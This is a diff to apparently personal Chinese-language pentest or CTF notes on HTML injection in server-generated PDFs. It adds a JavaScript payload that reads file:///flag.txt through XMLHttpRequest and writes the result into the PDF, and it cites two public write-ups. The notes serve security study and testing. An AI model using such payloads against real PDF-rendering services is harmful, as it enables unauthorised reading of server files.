@@ -137,6 +137,14 @@ sudo php -S 0.0.0.0:9200      启动 php 网页服务
 
 有应用程序接收用户输入并生成一个 PDF 文档
 插入一个简单的 JavaScript payload，如 <script>document.write('TESTING THIS')</script>，发现 JS 被执行，即 SSRF 漏洞，弱版 XSS
+  <script>
+      x=new XMLHttpRequest;
+      x.onload=function(){
+      document.write(this.responseText)};
+      x.open("GET","file:///flag.txt");
+      x.send();
+  </script>
+
   https://appsecco.com/blog/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2
   https://namratha-gm.medium.com/ssrf-to-local-file-read-through-html-injection-in-pdf-file-53711847cb2f
 
